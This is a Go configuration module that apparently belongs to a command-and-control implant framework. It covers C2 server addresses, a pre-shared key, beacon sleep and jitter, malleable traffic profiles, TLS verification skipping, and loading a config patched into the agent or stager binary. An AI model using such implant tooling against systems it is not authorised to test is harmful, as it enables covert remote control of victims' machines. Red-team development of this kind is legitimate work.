// Package config holds the agent's baked-in configuration.
// M0: JSON file. M5: same struct serialized into the template sentinel area
// (plan §4) — keep fields flat, JSON-only, no maps.
package config

import (
	"encoding/json"
	"fmt"
	"os"
	"strings"

	"wispp/protocol"
)

type Config struct {
	// Servers are Type1 endpoints with scheme dispatch:
	// http(s)://host:port -> HTTP listener; tcp://host:port -> raw TCP (plan §2.1).
	Servers []string `json:"servers"`
	PSK     string   `json:"psk"`
	// Path is a legacy shorthand for a default profile on that submit path.
	Path         string            `json:"path,omitempty"`
	Profile      *protocol.Profile `json:"profile,omitempty"`
	SleepMS      int               `json:"sleep_ms"`
	JitterPct    int               `json:"jitter_pct"`
	Insecure     bool              `json:"insecure"`                // skip TLS verify (self-signed, plan §3)
	PluginPubkey string            `json:"plugin_pubkey,omitempty"` // ed25519 hex; empty = no dynamic plugins
}

// anchor keeps the linker from stripping protocol.SentinelSlot: the patch
// sentinel must exist in .data of every binary built from this module.
var anchor = protocol.SentinelSlot[:]

// Embedded loads the config patched into this executable's sentinel slot
// (plan §4). Returns nil when running unpacked (e.g. `go run` in dev).
func Embedded() *Config {
	exe, err := os.Executable()
	if err != nil {
		return nil
	}
	image, err := os.ReadFile(exe)
	if err != nil {
		return nil
	}
	return FromImage(image)
}

// EmbeddedFromSlot reads the config from the in-memory sentinel. DLL builds
// cannot locate their own image via os.Executable (that returns the host
// process), but the patched .data bytes are already mapped.
func EmbeddedFromSlot() *Config {
	return FromImage(protocol.SentinelSlot[:])
}

// FromImage decodes a patched sentinel slot and rejects stager payloads.
func FromImage(image []byte) *Config {
	cfg, ok, err := protocol.FindCfgSlot(image)
	if !ok || err != nil || cfg.PSK == "" && !cfg.StagedSet() {
		return nil
	}
	if cfg.StagedSet() {
		return nil // this is a stager, not an agent (cmd/stager handles it)
	}
	c := &Config{Servers: cfg.Servers, Path: cfg.Path, Profile: cfg.Profile, PSK: cfg.PSK,
		SleepMS: cfg.SleepMS, JitterPct: cfg.JitterPct, Insecure: cfg.Insecure, PluginPubkey: cfg.PluginPubkey}
	if err := c.finalize(); err != nil {
		return nil
	}
	_ = anchor
	return c
}

// LoadForAgent resolves the configuration for a normal exe, a DLL export or a
// service. An explicit path wins, then WISPCFG (path or inline JSON), then the
// in-memory sentinel. WISPCFG only exists to exercise DLLs during development;
// generated artifacts always carry the slot.
func LoadForAgent(path string) (*Config, error) {
	if path != "" {
		if _, err := os.Stat(path); err == nil {
			return Load(path)
		}
	}
	if env := strings.TrimSpace(os.Getenv("WISPCFG")); env != "" {
		if strings.HasPrefix(env, "{") {
			c := &Config{}
			if err := json.Unmarshal([]byte(env), c); err != nil {
				return nil, fmt.Errorf("config: WISPCFG: %w", err)
			}
			if len(c.Servers) == 0 {
				return nil, fmt.Errorf("config: WISPCFG has no servers")
			}
			if err := c.finalize(); err != nil {
				return nil, err
			}
			return c, nil
		}
		return Load(env)
	}
	if c := EmbeddedFromSlot(); c != nil {
		return c, nil
	}
	if c := Embedded(); c != nil {
		return c, nil
	}
	return nil, fmt.Errorf("no config file (%s) and no embedded slot — this is not a patched payload", path)
}

func Load(path string) (*Config, error) {
	b, err := os.ReadFile(path)
	if err != nil {
		return nil, fmt.Errorf("config: %w", err)
	}
	c := &Config{}
	if err := json.Unmarshal(b, c); err != nil {
		return nil, fmt.Errorf("config: %w", err)
	}
	if len(c.Servers) == 0 {
		return nil, fmt.Errorf("config: no servers")
	}
	if err := c.finalize(); err != nil {
		return nil, err
	}
	return c, nil
}

// finalize fills the malleable profile from legacy fields and clamps timing.
func (c *Config) finalize() error {
	if c.Profile == nil {
		c.Profile = protocol.DefaultProfile()
		if c.Path != "" {
			c.Profile.URIs = []string{c.Path}
		}
	}
	if err := c.Profile.Validate(); err != nil {
		return fmt.Errorf("config: profile: %w", err)
	}
	if c.SleepMS < protocol.MinSleepMS {
		c.SleepMS = 3000
	}
	if c.JitterPct < 0 || c.JitterPct > protocol.MaxJitterPct {
		c.JitterPct = 30
	}
	return nil
}

// EffectiveSleep returns base ± jitter% (uniform), clamped to MinSleepMS.
func (c *Config) EffectiveSleep() int64 {
	return EffectiveSleep(c.SleepMS, c.JitterPct)
}
